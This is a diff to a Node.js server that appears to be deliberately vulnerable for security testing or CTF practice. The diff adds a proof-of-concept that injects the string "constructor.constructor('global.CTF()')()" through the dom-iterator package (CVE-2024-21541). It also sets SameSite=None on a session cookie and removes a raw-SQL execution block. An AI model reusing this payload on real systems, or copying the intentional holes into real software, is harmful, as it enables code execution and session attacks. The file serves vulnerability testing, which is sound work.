@@ -18,28 +18,21 @@ const server = http.createServer((req, res) => {
       const postData = qs.parse(body);
       let responseMessages = [];
 
+      // CVE-2024-21541: dom-iterator
+      var PUT = require('dom-iterator');
+      global.CTF = function() { console.log("GLOBAL.CTF HIT") } // We want to prove we can execute this by using the package
+
+      var parser = require('mini-html-parser');
+      var html = '<h1></h1>'; // Any non-empty html should work
+      var parser = parser(html);
+      var node = parser.parse();
+      var it = PUT(node);
+      var next;
+      while (next = it.next("constructor.constructor('global.CTF()')()")) { }
+
       // Vulnerability: Missing SameSite Attribute on Cookies
-      res.setHeader('Set-Cookie', `sessionToken=insecureToken; Path=/; HttpOnly`);
+      res.setHeader('Set-Cookie', `sessionToken=insecureToken; Path=/; HttpOnly; SameSite=None`);
       res.setHeader('Content-Type', 'text/html');
-
-      // Direct SQL Injection via string concatenation
-      if (postData.rawSql) {
-        try {
-          const rawQuery = `${postData.rawSql}`; 
-          responseMessages.push(`<p>Executing raw SQL query: ${rawQuery}</p>`);
-          const result = await sequelize.query(rawQuery, { type: sequelize.QueryTypes.SELECT });
-
-          if (result.length > 0) {
-            responseMessages.push(`<p>Query returned ${result.length} row(s):</p>`);
-            responseMessages.push(`<pre>${JSON.stringify(result, null, 2)}</pre>`);
-          } else {
-            responseMessages.push(`<p>No results found</p>`);
-          }
-        } catch (error) {
-          console.error("Raw SQL error:", error);
-          responseMessages.push(`<p>An error occurred: ${error.message}</p>`);
-        }
-      }
 
       // jQuery Vulnerability: CVE-2015-9251
       if (postData.jqueryUrl) {
